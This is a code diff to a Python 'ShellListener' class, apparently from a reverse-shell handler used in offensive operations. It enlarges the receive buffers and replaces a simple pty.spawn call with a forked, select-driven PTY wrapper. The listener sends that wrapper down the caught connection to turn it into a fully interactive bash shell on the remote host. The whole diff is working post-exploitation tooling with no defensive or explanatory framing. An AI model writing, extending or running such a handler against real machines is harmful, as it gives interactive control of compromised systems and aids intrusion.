@@ -109,7 +109,7 @@ class ShellListener:
             for _ in range(6):
                 time.sleep(0.1)
                 try:
-                    data = conn.recv(4096)
+                    data = conn.recv(65536)
                     if data:
                         buffered += data
                         text = data.decode(errors="replace").lower()
@@ -137,11 +137,32 @@ class ShellListener:
         try:
             conn.sendall(b"stty raw -echo rows 50 cols 120 2>/dev/null; export TERM=dumb\n")
             time.sleep(0.1)
-            conn.sendall(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null\n")
-            time.sleep(0.4)
+            wrapper = (
+                "import os,pty,select\n"
+                "m,s=pty.openpty()\n"
+                "pid=os.fork()\n"
+                "if pid==0:\n"
+                " os.setsid();os.dup2(s,0);os.dup2(s,1);os.dup2(s,2);"
+                "os.close(m);os.close(s);os.execv(\"/bin/bash\",[\"/bin/bash\",\"-i\"])\n"
+                "os.close(s)\n"
+                "while True:\n"
+                " r,_,_=select.select([0,m],[],[])\n"
+                " if 0 in r:\n"
+                "  d=os.read(0,65536)\n"
+                "  if not d: break\n"
+                "  os.write(m,d)\n"
+                " if m in r:\n"
+                "  d=os.read(m,65536)\n"
+                "  if not d: break\n"
+                "  os.write(1,d)\n"
+            )
+            cmd = ("python3 -c '%s' 2>/dev/null || python -c '%s' 2>/dev/null "
+                   "|| script -qc /bin/bash /dev/null 2>/dev/null") % (wrapper, wrapper)
+            conn.sendall((cmd + "\n").encode())
+            time.sleep(0.5)
             conn.sendall(b"export TERM=xterm; export SHELL=bash\n")
             time.sleep(0.1)
-            conn.sendall(b"stty rows 50 cols 120 2>/dev/null\n")
+            conn.sendall(b"stty sane 2>/dev/null; stty rows 50 cols 120 2>/dev/null\n")
             time.sleep(0.1)
             _dbg("[shell] PTY upgrade commands sent")
         except OSError as e:
@@ -158,7 +179,7 @@ class ShellListener:
         try:
             while self._running and shell_db.get_session(sid) and shell_db.get_session(sid).get("active"):
                 try:
-                    data = conn.recv(4096)
+                    data = conn.recv(65536)
                     if not data:
                         _dbg(f"[shell #{sid}] connection closed by remote")
                         break
